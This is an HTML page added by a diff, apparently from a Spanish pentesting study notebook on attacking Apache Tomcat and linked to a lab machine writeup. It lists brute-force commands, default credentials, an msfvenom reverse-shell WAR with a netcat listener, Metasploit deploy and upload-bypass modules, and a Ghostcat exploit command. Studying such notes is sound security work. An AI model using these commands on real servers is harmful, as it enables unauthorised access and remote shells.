@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Apache Tomcat | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="apache-tomcat">
+          <div class="note-tabbar">
+            <span>Apache Tomcat</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/Servidores y plataformas web</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / servidores y plataformas web / apache tomcat</p>
+            <h2>Apache Tomcat</h2>
+
+            <p><code>Apache Tomcat</code> suele exponer paneles de administración en puertos como <code>8080</code> y servicios AJP en <code>8009</code>.</p>
+
+            <h2>Enumeración</h2>
+
+            <section class="code-card">
+              <h3>Versiones</h3>
+              <pre><code>whatweb -v &lt;url&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Directorios sensibles</h3>
+              <pre><code>http://&lt;ip&gt;:8080/manager/
+http://&lt;ip&gt;:8080/manager/html
+http://&lt;ip&gt;:8080/host-manager/</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Fuzzing web</h3>
+              <pre><code>gobuster dir -u http://&lt;ip_target&gt;:8180/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt</code></pre>
+            </section>
+
+            <h2>Fuerza bruta</h2>
+
+            <section class="code-card">
+              <h3>mgr_brute.py</h3>
+              <pre><code>python mgr_brute.py -u &lt;users.txt&gt; -p &lt;pass.txt&gt; -U http://&lt;ip&gt;:8080/ -P host-manager/</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Metasploit</h3>
+              <pre><code>use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS &lt;url&gt;
+set USER_FILE /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Hydra</h3>
+              <pre><code>hydra -L &lt;users.txt&gt; -P &lt;pass.txt&gt; &lt;url&gt; http-get /manager/html</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Credenciales por defecto</h3>
+              <pre><code>admin:admin
+tomcat:tomcat
+tomcat:s3cret
+root:root</code></pre>
+            </section>
+
+            <h2>Acceso Tomcat: WAR controlado</h2>
+
+            <section class="code-card">
+              <h3>Manual</h3>
+              <pre><code># Login en http://ip:8080/manager/html
+# Subir WAR file to deploy
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip_kali&gt; LPORT=443 -f war -o shell.war
+# Listener: ejecutar payload accediendo a /shell
+rlwrap nc -nlvp 443</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Metasploit</h3>
+              <pre><code>use exploit/multi/http/tomcat_mgr_deploy
+set RHOSTS &lt;url&gt;
+set HTTPUSERNAME &lt;user&gt;
+set HTTPPASSWORD &lt;pass&gt;
+set PAYLOAD java/meterpreter/reverse_tcp
+set LHOST &lt;ip_kali&gt;
+set LPORT 4444
+set PATH /manager/text
+set target
+exploit</code></pre>
+            </section>
+
+            <h2><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">Ghostcat: Tomcat 9.0.x, 8.5.x, 7.0.x (CVE-2020-1938)</a></h2>
+
+            <aside class="callout">
+              <p><code>Puerto 8009</code>, servicio <code>ajp13</code>, versión <code>Jserv</code>. Este exploit permite leer archivos dentro de la carpeta de aplicaciones web, no archivos arbitrarios del sistema como <code>/etc/passwd</code>.</p>
+            </aside>
+
+            <section class="code-card">
+              <h3>Leer WEB-INF/web.xml</h3>
+              <pre><code>python2.7 exploit.py &lt;ip_target&gt; -p 8009 -f WEB-INF/web.xml</code></pre>
+            </section>
+
+            <h2>Apache Tomcat V8.5.19 (JSP payload)</h2>
+
+            <section class="code-card">
+              <h3>Metasploit JSP upload bypass</h3>
+              <pre><code>msfconsole -q
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set RHOSTS &lt;ip_target&gt;
+set PAYLOAD java/jsp_shell_bind_tcp
+set LHOST &lt;kali_ip&gt;
+set LPORT &lt;port&gt;
+set SHELL cmd # En este caso Apache corre en Windows
+run # Correr varias veces si no funciona</code></pre>
+            </section>
+
+            <h2>Máquinas relacionadas</h2>
+            <div class="notebook-related-links">
+              <a href="/writeups.html?machine=jerry">Jerry</a>
+            </div>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>tomcat</span>
+              <span>p8080</span>
+              <span>p8009</span>
+              <span>ajp13</span>
+              <span>war</span>
+              <span>ghostcat</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
